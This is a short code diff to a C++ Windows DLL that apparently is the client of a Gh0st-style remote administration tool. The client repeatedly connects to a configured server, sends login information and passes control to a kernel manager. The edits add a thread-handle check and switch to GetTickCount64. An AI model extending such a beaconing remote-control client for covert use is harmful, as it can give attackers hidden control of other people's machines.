@@ -108,6 +108,9 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 	g_uPort = uPort;
 
 	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);
+	if (hThread == NULL) {
+		return;
+	}
 #ifdef _DEBUG
 	WaitForSingleObject(hThread, 200);
 #else
@@ -134,14 +137,14 @@ DWORD WINAPI StartClient(LPVOID lParam)
 	g_bThreadExit = false;
 	while (!g_bExit)
 	{
-		DWORD dwTickCount = GetTickCount();
+		DWORD dwTickCount = GetTickCount64();
 		if (!ClientObject->ConnectServer(g_szServerIP, g_uPort))
 		{
 			for (int k = 500; !g_bExit && --k; Sleep(10));
 			continue;
 		}
 		//准备第一波数据
-		SendLoginInfo(ClientObject, GetTickCount()-dwTickCount); 
+		SendLoginInfo(ClientObject, GetTickCount64()-dwTickCount);
 
 		CKernelManager	Manager(ClientObject);   
 		bool	bIsRun = 0;
